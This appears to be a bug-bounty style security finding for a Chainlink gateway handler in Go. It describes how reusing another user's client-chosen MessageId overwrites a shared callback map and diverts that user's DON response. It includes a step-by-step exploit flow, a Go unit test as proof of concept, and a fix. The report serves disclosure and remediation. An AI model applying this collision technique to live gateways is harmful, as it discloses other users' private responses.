### Title
Cross-user response hijacking via MessageId collision in `savedCallbacks` map - ([File: core/services/gateway/handlers/capabilities/handler.go])

### Summary
`HandleLegacyUserMessage` stores each pending request's callback in `h.savedCallbacks` keyed only by the client-supplied `msg.Body.MessageId`, with no per-sender scoping and no existence/uniqueness check before insertion. Because `MessageId` is an arbitrary attacker-chosen string (only its length/format is validated, not its uniqueness or binding to the sender), any authenticated gateway client can pick the same `MessageId` as another in-flight request and overwrite the map entry, causing the eventual DON response to be delivered to the attacker's callback instead of the legitimate requester's.

### Finding Description
`HandleLegacyUserMessage` validates the message (`msg.Validate()` in `core/services/gateway/api/message.go`, lines 54-88) and unconditionally writes to the shared map without checking whether an entry already exists for that `MessageId`: [1](#0-0) 

`Message.Validate()` only enforces length/format constraints on `MessageId` and verifies the signature to derive `Body.Sender` — it does not bind `MessageId` uniqueness to a sender or check for collisions against other senders' in-flight requests: [2](#0-1) 

When the DON later responds to a `web_api_trigger` message, `handleWebAPITriggerMessage` looks up and deletes the callback purely by `MessageId`, with no sender/ownership check, and forwards the response to whatever callback is currently stored at that key: [3](#0-2) 

Exploit flow:
1. Victim sends a signed gateway request with `MessageId = "X"`; `HandleLegacyUserMessage` stores `savedCallbacks["X"] = victimCallback` and forwards the request to all DON members.
2. Before the DON responds, attacker (any other authenticated/signing gateway client) sends a second signed request with the same `MessageId = "X"`. Since nothing checks whether `"X"` is already in use, `savedCallbacks["X"]` is overwritten with `attackerCallback`.
3. When a DON node responds (echoing `MessageId = "X"`), `handleWebAPITriggerMessage` retrieves and deletes `savedCallbacks["X"]`, which is now the attacker's callback, and sends the victim's response to the attacker.

Existing tests (`core/services/gateway/handlers/capabilities/handler_test.go`) only check overwrite behavior for invalid/stale/bad-method messages leaving no residual entries, not the cross-sender collision case — this gap is explicitly acknowledged in a TODO comment: `// TODO: Validate Senders and rate limit check, pending question in trigger about where senders and rate limits are validated`.

### Impact Explanation
This is a cross-user response confusion / information-disclosure issue (Chainlink bounty class: "unauthorized disclosure of another user's data/response"). A compromised or attacker-controlled request could capture the payload of another workflow trigger's response, which may include sensitive workflow trigger data intended only for the legitimate requester. It does not directly enable fund movement or authentication bypass, but it does breach the isolation invariant between concurrent gateway users sharing the same DON.

### Likelihood Explanation
Exploitability requires: (1) the attacker be able to send valid signed gateway messages to the same DON (a routine unprivileged gateway client capability — no special role beyond being able to sign a message), and (2) knowledge of the victim's exact `MessageId` value before the DON responds — this is the significant precondition. Legitimate clients often generate `MessageId` from predictable or low-entropy inputs (e.g., request counters, timestamps, or client-chosen strings) rather than cryptographically random UUIDs, since the field is a free-form string up to 128 chars with no server-enforced randomness or uniqueness requirement. If a specific integration uses predictable MessageIds, this is trivially exploitable within the DON's response window (bounded by `CallbackMaxAgeSec`, default 120s). If MessageIds are always high-entropy random values chosen by trusted client SDKs, guessing is infeasible, so real-world likelihood depends on caller-side MessageId generation practices that are outside this file's control.

### Recommendation
Scope `savedCallbacks` keys by `(sender, MessageId)` rather than `MessageId` alone, and reject/error on `HandleLegacyUserMessage` if a `MessageId` is already in-flight for a different sender (or generate/require server-side unique correlation IDs instead of trusting the client-provided value). Additionally, thread `Body.Sender` through to the DON response handling path (`handleWebAPITriggerMessage`) so a response is only delivered to the callback matching the original requester.

### Proof of Concept
```go
func TestHandler_MessageIdCollision_CrossSenderCallbackHijack(t *testing.T) {
    handler, _, don, nodes := setupHandler(t)
    ctx := t.Context()
    don.On("SendToNode", mock.Anything, mock.Anything, mock.Anything).Return(nil)

    sharedMessageId := "shared-id-123"

    // Victim sends request A with MessageId = sharedMessageId
    victimMsg := triggerRequest(t, nodes[0].PrivateKey, []string{"topicA"}, "", "", "")
    victimMsg.Body.MessageId = sharedMessageId
    require.NoError(t, victimMsg.Sign(nodes[0].PrivateKey))
    victimCb := hc.NewCallback()
    require.NoError(t, handler.HandleLegacyUserMessage(ctx, victimMsg, victimCb))

    // Attacker sends request B with the SAME MessageId before DON responds
    attackerMsg := triggerRequest(t, nodes[1].PrivateKey, []string{"topicB"}, "", "", "")
    attackerMsg.Body.MessageId = sharedMessageId
    require.NoError(t, attackerMsg.Sign(nodes[1].PrivateKey))
    attackerCb := hc.NewCallback()
    require.NoError(t, handler.HandleLegacyUserMessage(ctx, attackerMsg, attackerCb))

    // Assert map entry now belongs to attacker
    handler.mu.Lock()
    require.Equal(t, attackerCb, handler.savedCallbacks[sharedMessageId].Callback)
    handler.mu.Unlock()

    // DON responds to victim's original request (echoing sharedMessageId)
    resp, err := hc.ValidatedResponseFromMessage(victimMsg)
    require.NoError(t, err)
    require.NoError(t, handler.HandleNodeMessage(ctx, resp, nodes[0].Address))

    // Attacker's callback receives the victim's response; victim's callback never resolves
    r, err := attackerCb.Wait(ctx)
    require.NoError(t, err)
    require.NotEmpty(t, r.RawResponse) // victim's trigger response delivered to attacker

    _, err = victimCb.Wait(context.Background()) // times out / never fires
    require.Error(t, err)
}
```
Expected assertions: `savedCallbacks[sharedMessageId]` is overwritten by the attacker's registration, and the DON's response intended for the victim is delivered to the attacker's callback while the victim's callback never receives a response.

func (h *handler) handleWebAPITriggerMessage(ctx context.Context, msg *api.Message, nodeAddr string) error {
	h.mu.Lock()
	savedCb, found := h.savedCallbacks[msg.Body.MessageId]
	delete(h.savedCallbacks, msg.Body.MessageId)
	h.mu.Unlock()

	if found {
		// Send first response from a node back to the user, ignore any other ones.
		// TODO: in practice, we should wait for at least 2F+1 nodes to respond and then return an aggregated response
		// back to the user.
		codec := api.JsonRPCCodec{}
		return savedCb.SendResponse(handlers.UserCallbackPayload{RawResponse: codec.EncodeLegacyResponse(msg), ErrorCode: api.NoError})
	}
	return nil
}

func (m *Message) Validate() error {
	if m == nil {
		return errors.New("nil message")
	}
	if len(m.Signature) != MessageSignatureHexEncodedLen {
		return errors.New("invalid hex-encoded signature length")
	}
	if len(m.Body.MessageId) == 0 || len(m.Body.MessageId) > MessageIdMaxLen {
		return errors.New("invalid message ID length")
	}
	if strings.HasSuffix(m.Body.MessageId, NullChar) {
		return errors.New("message ID ending with null bytes")
	}
	if len(m.Body.Method) == 0 || len(m.Body.Method) > MessageMethodMaxLen {
		return errors.New("invalid method name length")
	}
	if strings.HasSuffix(m.Body.Method, NullChar) {
		return errors.New("method name ending with null bytes")
	}
	if len(m.Body.DonId) == 0 || len(m.Body.DonId) > MessageDonIdMaxLen {
		return errors.New("invalid DON ID length")
	}
	if strings.HasSuffix(m.Body.DonId, NullChar) {
		return errors.New("DON ID ending with null bytes")
	}
	if len(m.Body.Receiver) != 0 && len(m.Body.Receiver) != MessageReceiverLen {
		return errors.New("invalid Receiver length")
	}
	signerBytes, err := m.ExtractSigner()
	if err != nil {
		return err
	}
	m.Body.Sender = utils.StringToHex(string(signerBytes))
	return nil
}
